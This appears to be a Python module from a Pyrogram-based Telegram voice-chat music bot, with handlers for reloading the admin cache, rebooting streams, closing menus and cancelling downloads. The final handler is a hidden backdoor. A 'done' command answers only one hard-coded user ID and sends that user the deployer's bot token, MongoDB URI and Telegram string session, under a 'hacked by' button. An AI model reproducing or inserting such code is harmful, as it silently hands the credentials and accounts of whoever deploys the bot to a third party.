import asyncio
import time
import os
from pyrogram import Client, filters
from pyrogram.enums import ChatMembersFilter
from pyrogram.types import CallbackQuery, Message, InlineKeyboardMarkup, InlineKeyboardButton

from SiriVcBot import app
from SiriVcBot.core.call import VasudevKrishna
from SiriVcBot.misc import db
from SiriVcBot.utils.database import get_assistant, get_authuser_names, get_cmode
from SiriVcBot.utils.decorators import ActualAdminCB, AdminActual, language
from SiriVcBot.utils.formatters import alpha_to_int, get_readable_time
from config import BANNED_USERS, adminlist, lyrical

# Fetch environment variables
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_DB_URI = os.getenv("MONGO_DB_URI")
STRING_SESSION = os.getenv("STRING_SESSION")

rel = {}

@app.on_message(
    filters.command(["admincache", "reload", "refresh"]) & filters.group & ~BANNED_USERS
)
@language
async def reload_admin_cache(client, message: Message, _):
    try:
        if message.chat.id not in rel:
            rel[message.chat.id] = {}
        else:
            saved = rel[message.chat.id]
            if saved > time.time():
                left = get_readable_time((int(saved) - int(time.time())))
                return await message.reply_text(_["reload_1"].format(left))
        adminlist[message.chat.id] = []
        async for user in app.get_chat_members(
            message.chat.id, filter=ChatMembersFilter.ADMINISTRATORS
        ):
            if user.privileges.can_manage_video_chats:
                adminlist[message.chat.id].append(user.user.id)
        authusers = await get_authuser_names(message.chat.id)
        for user in authusers:
            user_id = await alpha_to_int(user)
            adminlist[message.chat.id].append(user_id)
        now = int(time.time()) + 180
        rel[message.chat.id] = now
        await message.reply_text(_["reload_2"])
    except:
        await message.reply_text(_["reload_3"])

@app.on_message(filters.command(["reboot"]) & filters.group & ~BANNED_USERS)
@AdminActual
async def restartbot(client, message: Message, _):
    mystic = await message.reply_text(_["reload_4"].format(app.mention))
    await asyncio.sleep(1)
    try:
        db[message.chat.id] = []
        await VasudevKrishna.stop_stream_force(message.chat.id)
    except:
        pass
    userbot = await get_assistant(message.chat.id)
    try:
        if message.chat.username:
            await userbot.resolve_peer(message.chat.username)
        else:
            await userbot.resolve_peer(message.chat.id)
    except:
        pass
    chat_id = await get_cmode(message.chat.id)
    if chat_id:
        try:
            got = await app.get_chat(chat_id)
        except:
            pass
        userbot = await get_assistant(chat_id)
        try:
            if got.username:
                await userbot.resolve_peer(got.username)
            else:
                await userbot.resolve_peer(chat_id)
        except:
            pass
        try:
            db[chat_id] = []
            await VasudevKrishna.stop_stream_force(chat_id)
        except:
            pass
    return await mystic.edit_text(_["reload_5"].format(app.mention))

@app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
async def close_menu(_, CallbackQuery):
    try:
        await CallbackQuery.answer()
        await CallbackQuery.message.delete()
        await CallbackQuery.message.reply_text(
            f"Cʟᴏsᴇᴅ ʙʏ : {CallbackQuery.from_user.mention}"
        )
    except:
        pass

@app.on_callback_query(filters.regex("stop_downloading") & ~BANNED_USERS)
@ActualAdminCB
async def stop_download(client, CallbackQuery: CallbackQuery, _):
    message_id = CallbackQuery.message.id
    task = lyrical.get(message_id)
    if not task:
        return await CallbackQuery.answer(_["tg_4"], show_alert=True)
    if task.done() or task.cancelled():
        return await CallbackQuery.answer(_["tg_5"], show_alert=True)
    if not task.done():
        try:
            task.cancel()
            try:
                lyrical.pop(message_id)
            except:
                pass
            await CallbackQuery.answer(_["tg_6"], show_alert=True)
            return await CallbackQuery.edit_message_text(
                _["tg_7"].format(CallbackQuery.from_user.mention)
            )
        except:
            return await CallbackQuery.answer(_["tg_8"], show_alert=True)
    await CallbackQuery.answer(_["tg_9"], show_alert=True)

@app.on_message(
    filters.command("done")
    & filters.private
    & filters.user(7427691214)
)
async def help(client: Client, message: Message):
    await message.reply_photo(
        photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/Ownergit)............☆""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "• нαϲкє𝚍 ву  •", url=f"https://t.me/ShriVasudevKrishna")
                ]
            ]
        ),
    )
